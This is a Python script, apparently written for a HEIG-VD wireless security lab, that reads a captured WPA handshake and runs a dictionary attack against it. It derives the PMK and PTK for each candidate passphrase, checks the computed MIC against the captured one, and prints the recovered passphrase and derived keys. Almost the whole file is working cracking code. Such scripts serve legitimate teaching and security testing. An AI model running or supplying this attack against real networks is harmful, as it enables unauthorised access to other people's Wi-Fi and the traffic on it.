#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Besseau léonard, GaMbOnI FiOnA, Miguel Do Vale Lopes"
__copyright__ = "Copyright 2022, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


wpa = rdpcap("wpa_handshake.cap")

dictionary = "dict.txt"
A = "Pairwise key expansion"
ssid = wpa[0].info.decode('utf-8')
APmac = a2b_hex(wpa[0].addr2.replace(':', ''))
Clientmac = a2b_hex(wpa[1].addr1.replace(':', ''))

ANonce = wpa[5].original[67:99]
SNonce = wpa[6].original[65:97]

mic_to_test = wpa[8].original[-18:-2]

B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                              SNonce)  # used in pseudo-random function

data = wpa[8].original[48:-18] + b"\00" * 18  # We set the MIC to 0

mic_type = int(b2a_hex(wpa[5].original[55:57]), 16) & 0b111

print("\n\nValues used to derivate keys")
print("============================")
print("Dictionary : ", dictionary, "\n")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("AP Nonce: ", b2a_hex(ANonce), "\n")
print("Client Nonce: ", b2a_hex(SNonce), "\n")

with open(dictionary, "r") as passphrases:
    index = 0
    for passphrase in passphrases:
        passphrase = passphrase.strip('\n')
        if index % 100 == 0:
            print("{}: {}".format(index, passphrase))

        pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), ssid.encode(), 4096, 32)

        # expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK (support for SHA1 and MD5)
        mic = hmac.new(ptk[0:16], data, hashlib.sha1 if mic_type == 2 else hashlib.md5)
        index += 1
        if mic.digest()[:-4] != mic_to_test:
            continue
        print("Passphrase found : \"{}\". {} attempts".format(passphrase, index))

        print("\nResults of the key expansion")
        print("=============================")
        print("PMK:\t\t", pmk.hex(), "\n")
        print("PTK:\t\t", ptk.hex(), "\n")
        print("KCK:\t\t", ptk[0:16].hex(), "\n")
        print("KEK:\t\t", ptk[16:32].hex(), "\n")
        print("TK:\t\t", ptk[32:48].hex(), "\n")
        print("MICK:\t\t", ptk[48:64].hex(), "\n")
        print("MIC:\t\t", mic.hexdigest(), "\n")
        break
